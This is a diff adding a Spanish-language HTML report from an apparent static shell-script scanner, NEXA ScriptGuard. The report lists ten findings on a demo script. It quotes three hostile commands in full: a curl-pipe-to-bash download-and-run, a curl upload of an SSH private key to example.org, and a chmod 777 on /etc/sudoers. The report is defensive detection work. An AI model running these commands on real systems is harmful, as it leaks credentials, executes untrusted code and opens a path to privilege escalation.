@@ -1,0 +1,130 @@
+<!doctype html><html lang="es"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>NEXA ScriptGuard — Informe</title><style>
+    :root{--bg:#04070d;--cyan:#00d9ff;--violet:#ab54ff;--red:#ff354c;--white:#f5f7ff;--muted:#b0b7d0}
+    *{box-sizing:border-box}body{margin:0;background:radial-gradient(ellipse at 6% 0%,#2d0e2b 0%,transparent 25%),radial-gradient(ellipse at 95% 22%,#071c36 0%,transparent 34%),var(--bg);color:var(--white);font:15px/1.6 system-ui,sans-serif}main{max-width:1120px;margin:auto;padding:38px 22px 75px}
+    header{display:flex;align-items:center;gap:27px;border-bottom:1px solid #315272;padding-bottom:22px;flex-wrap:wrap}.shield{display:grid;place-items:center;width:106px;height:116px;clip-path:polygon(50% 0%,98% 21%,92% 75%,50% 100%,8% 75%,2% 21%);background:linear-gradient(140deg,#b452ff,#00dbff);filter:drop-shadow(0 0 13px #00c9fa)}.shield span{display:grid;place-items:center;width:98px;height:107px;clip-path:inherit;background:#071123;font-size:58px;font-weight:800;color:#00d9ff;text-shadow:0 0 14px #05d9ff}
+    h1{font-size:clamp(30px,5vw,54px);margin:0;letter-spacing:-1.4px}h1 b{color:#00d9ff}.subtitle{letter-spacing:.32em;color:#bcb9dd;font-size:12px}.motto{color:#bdd7ec;font-style:italic;margin:6px 0}.top{padding:24px 0}.top strong{color:#00d9ff}.path{overflow-wrap:anywhere;color:#edf2ff}.hash{font:12px/1.8 ui-monospace,monospace;color:#98acc9;overflow-wrap:anywhere}.summary{display:inline-block;padding:9px 16px;border:1px solid #296c81;border-radius:9px;background:#051825;color:#94f1fc;margin-top:12px}
+    .finding{border:1px solid var(--sev,#ff354c);box-shadow:0 0 10px color-mix(in srgb,var(--sev) 50%,transparent),inset 0 0 17px color-mix(in srgb,var(--sev) 9%,transparent);border-radius:22px;padding:25px 28px;margin:27px 0;background:linear-gradient(110deg,#080b15,#090f1c 85%)}.heading{display:flex;gap:12px;align-items:center;flex-wrap:wrap}.flag{font-weight:800;letter-spacing:.16em;color:var(--sev);border-left:5px solid var(--sev);padding-left:12px}.rule{color:#80e5ff;font:12px ui-monospace,monospace}.finding h2{font-size:clamp(21px,3vw,30px);margin:12px 0 4px}.metadata{font-size:12px;letter-spacing:.08em;color:#a3adca}.metadata strong{color:#fff}h3{color:#a8eaff;font-size:13px;letter-spacing:.12em;margin-top:24px}.instruction{overflow:auto;white-space:pre-wrap;overflow-wrap:anywhere;background:#020711;border:1px solid #18b8e2;box-shadow:0 0 12px #02b9ed45;border-radius:9px;padding:19px;color:#fff;font-size:13px}.line-number{color:#ff465d;font-weight:800}.detail{border-top:1px solid #223047;padding-top:13px;margin-top:16px}.detail>span{display:block;font-size:12px;letter-spacing:.10em;color:#50dfff;font-weight:750}.detail p{margin:7px 0;color:#e9edfa}.detail code{color:#e9e8fc;overflow-wrap:anywhere}.detail ul{margin-bottom:5px;padding-left:20px}.detail li{margin-top:7px}footer{margin-top:20px;color:#e7b1bf;font-size:11px;letter-spacing:.1em}.notice{color:#b8c5d9;font-size:13px}.branding{color:#b4a3e6;text-align:center;margin-top:36px;letter-spacing:.04em}@media(max-width:600px){.finding{padding:18px}}
+    </style></head><body><main><header><div class="shield"><span>∞</span></div><div><h1>NEXA <b>ScriptGuard</b></h1><div class="subtitle">NEXTGENAI INFINITY · STATIC SECURITY ANALYZER</div><div class="motto">AI assists. Human verifies. Human decides.</div></div></header>
+    <section class="top"><div>ARCHIVO ANALIZADO · <strong class="path">/mnt/data/NEXA-ScriptGuard/demo_example.sh</strong></div><div class="hash">SHA-256: 6be486c33ebec84fa896f7c124152bb6b86b4eb6aa3a47648756d03f77b7eff6</div><div class="hash">FECHA UTC: 2026-11-18T15:21:04.475308+00:00</div><div class="summary">10 HALLAZGOS · CRITICAL 2 · HIGH 4 · MEDIUM 4</div></section>
+    <section class="finding" style="--sev:#ff3e51">
+          <div class="heading"><span class="flag">⚠ CRITICAL</span><span class="rule">SG-EXEC-001</span></div>
+          <h2>Descarga y ejecución encadenadas</h2>
+          <div class="metadata">LÍNEA <strong>4</strong> · COLUMNA <strong>1</strong> · CONFIANZA: HEURÍSTICA</div>
+          <h3>INSTRUCCIÓN ORIGINAL DETECTADA</h3>
+          <pre class="instruction"><span class="line-number">0004 │</span> curl -fsSL https://example.org/setup.sh | bash</pre>
+          <div class="detail"><span>FRAGMENTO DETECTADO</span><code>curl -fsSL https://example.org/setup.sh | bash</code></div>
+          <div class="detail"><span>ANÁLISIS TÉCNICO</span><p>Ejecuta contenido obtenido de la red sin inspección previa.</p></div>
+          <div class="detail"><span>RECOMENDACIÓN</span><p>Descargar por separado, verificar origen, firma o hash y revisar el contenido antes de ejecutar.</p></div>
+          <div class="detail"><span>COMANDOS PARA VERIFICAR · NO EJECUTADOS</span><ul><li><code>Inspeccionar URL y dominio con dig/getent</code></li><li><code>Revisar el script descargado con less y sha256sum</code></li></ul></div>
+          <footer>ESTADO: REQUIERE REVISIÓN HUMANA</footer>
+        </section>
+<section class="finding" style="--sev:#ff3e51">
+          <div class="heading"><span class="flag">⚠ CRITICAL</span><span class="rule">SG-EXFIL-001</span></div>
+          <h2>Transferencia potencial de datos sensibles</h2>
+          <div class="metadata">LÍNEA <strong>5</strong> · COLUMNA <strong>1</strong> · CONFIANZA: HEURÍSTICA</div>
+          <h3>INSTRUCCIÓN ORIGINAL DETECTADA</h3>
+          <pre class="instruction"><span class="line-number">0005 │</span> curl --data-binary @/home/usuario/.ssh/id_rsa https://example.org/upload</pre>
+          <div class="detail"><span>FRAGMENTO DETECTADO</span><code>curl --data-binary @</code></div>
+          <div class="detail"><span>ANÁLISIS TÉCNICO</span><p>Puede enviar el contenido de archivos a un destino externo.</p></div>
+          <div class="detail"><span>RECOMENDACIÓN</span><p>Identificar archivo fuente, destino y autorización de la transferencia.</p></div>
+          <div class="detail"><span>COMANDOS PARA VERIFICAR · NO EJECUTADOS</span><ul><li><code>stat /ruta/del/archivo</code></li><li><code>file /ruta/del/archivo</code></li><li><code>getent ahosts dominio.example</code></li></ul></div>
+          <footer>ESTADO: REQUIERE REVISIÓN HUMANA</footer>
+        </section>
+<section class="finding" style="--sev:#ff6c5c">
+          <div class="heading"><span class="flag">⚠ HIGH</span><span class="rule">SG-CRED-001</span></div>
+          <h2>Referencia a credenciales sensibles</h2>
+          <div class="metadata">LÍNEA <strong>5</strong> · COLUMNA <strong>35</strong> · CONFIANZA: HEURÍSTICA</div>
+          <h3>INSTRUCCIÓN ORIGINAL DETECTADA</h3>
+          <pre class="instruction"><span class="line-number">0005 │</span> curl --data-binary @/home/usuario/.ssh/id_rsa https://example.org/upload</pre>
+          <div class="detail"><span>FRAGMENTO DETECTADO</span><code>.ssh/id_rsa</code></div>
+          <div class="detail"><span>ANÁLISIS TÉCNICO</span><p>Se hace referencia a archivos que pueden contener credenciales o configuración sensible.</p></div>
+          <div class="detail"><span>RECOMENDACIÓN</span><p>Determinar si la lectura es necesaria y evitar registrar o transmitir secretos.</p></div>
+          <div class="detail"><span>COMANDOS PARA VERIFICAR · NO EJECUTADOS</span><ul><li><code>stat /ruta/del/archivo</code></li><li><code>ls -l /ruta/del/archivo</code></li></ul></div>
+          <footer>ESTADO: REQUIERE REVISIÓN HUMANA</footer>
+        </section>
+<section class="finding" style="--sev:#ff6c5c">
+          <div class="heading"><span class="flag">⚠ HIGH</span><span class="rule">SG-PRIV-002</span></div>
+          <h2>Permisos potencialmente inseguros</h2>
+          <div class="metadata">LÍNEA <strong>6</strong> · COLUMNA <strong>6</strong> · CONFIANZA: HEURÍSTICA</div>
+          <h3>INSTRUCCIÓN ORIGINAL DETECTADA</h3>
+          <pre class="instruction"><span class="line-number">0006 │</span> sudo chmod 777 /etc/sudoers</pre>
+          <div class="detail"><span>FRAGMENTO DETECTADO</span><code>chmod 777</code></div>
+          <div class="detail"><span>ANÁLISIS TÉCNICO</span><p>Puede otorgar permisos excesivos o establecer bits privilegiados.</p></div>
+          <div class="detail"><span>RECOMENDACIÓN</span><p>Aplicar permisos mínimos y revisar propietario y grupo.</p></div>
+          <div class="detail"><span>COMANDOS PARA VERIFICAR · NO EJECUTADOS</span><ul><li><code>stat /ruta/del/archivo</code></li><li><code>getfacl /ruta/del/archivo</code></li></ul></div>
+          <footer>ESTADO: REQUIERE REVISIÓN HUMANA</footer>
+        </section>
+<section class="finding" style="--sev:#ff6c5c">
+          <div class="heading"><span class="flag">⚠ HIGH</span><span class="rule">SG-CRED-001</span></div>
+          <h2>Referencia a credenciales sensibles</h2>
+          <div class="metadata">LÍNEA <strong>6</strong> · COLUMNA <strong>16</strong> · CONFIANZA: HEURÍSTICA</div>
+          <h3>INSTRUCCIÓN ORIGINAL DETECTADA</h3>
+          <pre class="instruction"><span class="line-number">0006 │</span> sudo chmod 777 /etc/sudoers</pre>
+          <div class="detail"><span>FRAGMENTO DETECTADO</span><code>/etc/sudoers</code></div>
+          <div class="detail"><span>ANÁLISIS TÉCNICO</span><p>Se hace referencia a archivos que pueden contener credenciales o configuración sensible.</p></div>
+          <div class="detail"><span>RECOMENDACIÓN</span><p>Determinar si la lectura es necesaria y evitar registrar o transmitir secretos.</p></div>
+          <div class="detail"><span>COMANDOS PARA VERIFICAR · NO EJECUTADOS</span><ul><li><code>stat /ruta/del/archivo</code></li><li><code>ls -l /ruta/del/archivo</code></li></ul></div>
+          <footer>ESTADO: REQUIERE REVISIÓN HUMANA</footer>
+        </section>
+<section class="finding" style="--sev:#ff6c5c">
+          <div class="heading"><span class="flag">⚠ HIGH</span><span class="rule">SG-PRIV-001</span></div>
+          <h2>Modificación de sudoers</h2>
+          <div class="metadata">LÍNEA <strong>6</strong> · COLUMNA <strong>16</strong> · CONFIANZA: HEURÍSTICA</div>
+          <h3>INSTRUCCIÓN ORIGINAL DETECTADA</h3>
+          <pre class="instruction"><span class="line-number">0006 │</span> sudo chmod 777 /etc/sudoers</pre>
+          <div class="detail"><span>FRAGMENTO DETECTADO</span><code>/etc/sudoers</code></div>
+          <div class="detail"><span>ANÁLISIS TÉCNICO</span><p>Puede modificar políticas de elevación de privilegios.</p></div>
+          <div class="detail"><span>RECOMENDACIÓN</span><p>Revisar cambios propuestos y aplicar mínimo privilegio.</p></div>
+          <div class="detail"><span>COMANDOS PARA VERIFICAR · NO EJECUTADOS</span><ul><li><code>sudo visudo -c</code></li></ul></div>
+          <footer>ESTADO: REQUIERE REVISIÓN HUMANA</footer>
+        </section>
+<section class="finding" style="--sev:#ffc36e">
+          <div class="heading"><span class="flag">⚠ MEDIUM</span><span class="rule">SG-NET-002</span></div>
+          <h2>Descarga de recurso externo</h2>
+          <div class="metadata">LÍNEA <strong>4</strong> · COLUMNA <strong>1</strong> · CONFIANZA: HEURÍSTICA</div>
+          <h3>INSTRUCCIÓN ORIGINAL DETECTADA</h3>
+          <pre class="instruction"><span class="line-number">0004 │</span> curl -fsSL https://example.org/setup.sh | bash</pre>
+          <div class="detail"><span>FRAGMENTO DETECTADO</span><code>curl</code></div>
+          <div class="detail"><span>ANÁLISIS TÉCNICO</span><p>Obtiene o transmite información por red; la operación puede ser legítima.</p></div>
+          <div class="detail"><span>RECOMENDACIÓN</span><p>Verificar URL, TLS, procedencia e integridad del artefacto.</p></div>
+          <div class="detail"><span>COMANDOS PARA VERIFICAR · NO EJECUTADOS</span><ul><li><code>getent ahosts dominio.example</code></li></ul></div>
+          <footer>ESTADO: REQUIERE REVISIÓN HUMANA</footer>
+        </section>
+<section class="finding" style="--sev:#ffc36e">
+          <div class="heading"><span class="flag">⚠ MEDIUM</span><span class="rule">SG-NET-002</span></div>
+          <h2>Descarga de recurso externo</h2>
+          <div class="metadata">LÍNEA <strong>5</strong> · COLUMNA <strong>1</strong> · CONFIANZA: HEURÍSTICA</div>
+          <h3>INSTRUCCIÓN ORIGINAL DETECTADA</h3>
+          <pre class="instruction"><span class="line-number">0005 │</span> curl --data-binary @/home/usuario/.ssh/id_rsa https://example.org/upload</pre>
+          <div class="detail"><span>FRAGMENTO DETECTADO</span><code>curl</code></div>
+          <div class="detail"><span>ANÁLISIS TÉCNICO</span><p>Obtiene o transmite información por red; la operación puede ser legítima.</p></div>
+          <div class="detail"><span>RECOMENDACIÓN</span><p>Verificar URL, TLS, procedencia e integridad del artefacto.</p></div>
+          <div class="detail"><span>COMANDOS PARA VERIFICAR · NO EJECUTADOS</span><ul><li><code>getent ahosts dominio.example</code></li></ul></div>
+          <footer>ESTADO: REQUIERE REVISIÓN HUMANA</footer>
+        </section>
+<section class="finding" style="--sev:#ffc36e">
+          <div class="heading"><span class="flag">⚠ MEDIUM</span><span class="rule">SG-PRIV-003</span></div>
+          <h2>Uso de privilegios elevados</h2>
+          <div class="metadata">LÍNEA <strong>6</strong> · COLUMNA <strong>1</strong> · CONFIANZA: HEURÍSTICA</div>
+          <h3>INSTRUCCIÓN ORIGINAL DETECTADA</h3>
+          <pre class="instruction"><span class="line-number">0006 │</span> sudo chmod 777 /etc/sudoers</pre>
+          <div class="detail"><span>FRAGMENTO DETECTADO</span><code>sudo</code></div>
+          <div class="detail"><span>ANÁLISIS TÉCNICO</span><p>Ejecuta acciones con una identidad privilegiada.</p></div>
+          <div class="detail"><span>RECOMENDACIÓN</span><p>Comprobar que la operación requiere privilegios y limitar su alcance.</p></div>
+          <div class="detail"><span>COMANDOS PARA VERIFICAR · NO EJECUTADOS</span><ul><li><code>Revisar comando completo y rutas afectadas</code></li></ul></div>
+          <footer>ESTADO: REQUIERE REVISIÓN HUMANA</footer>
+        </section>
+<section class="finding" style="--sev:#ffc36e">
+          <div class="heading"><span class="flag">⚠ MEDIUM</span><span class="rule">SG-FS-001</span></div>
+          <h2>Cambios de propietario o permisos</h2>
+          <div class="metadata">LÍNEA <strong>6</strong> · COLUMNA <strong>6</strong> · CONFIANZA: HEURÍSTICA</div>
+          <h3>INSTRUCCIÓN ORIGINAL DETECTADA</h3>
+          <pre class="instruction"><span class="line-number">0006 │</span> sudo chmod 777 /etc/sudoers</pre>
+          <div class="detail"><span>FRAGMENTO DETECTADO</span><code>chmod</code></div>
+          <div class="detail"><span>ANÁLISIS TÉCNICO</span><p>Modifica controles de acceso a archivos.</p></div>
+          <div class="detail"><span>RECOMENDACIÓN</span><p>Revisar rutas, propietarios y permisos resultantes.</p></div>
+          <div class="detail"><span>COMANDOS PARA VERIFICAR · NO EJECUTADOS</span><ul><li><code>stat /ruta/del/archivo</code></li></ul></div>
+          <footer>ESTADO: REQUIERE REVISIÓN HUMANA</footer>
+        </section><p class="notice">⚠ Análisis estático heurístico. El archivo inspeccionado NO se ejecutó. La ausencia de alertas no acredita seguridad. Los comandos de verificación son orientativos y NO se ejecutan. Las instrucciones originales podrían contener secretos: revisá el informe antes de compartirlo.</p>
+    <div class="branding">THERE IS NO FINAL VERSION. THERE IS ONLY EVOLUTION. · ♾ NEXTGENAI INFINITY</div></main></body></html>
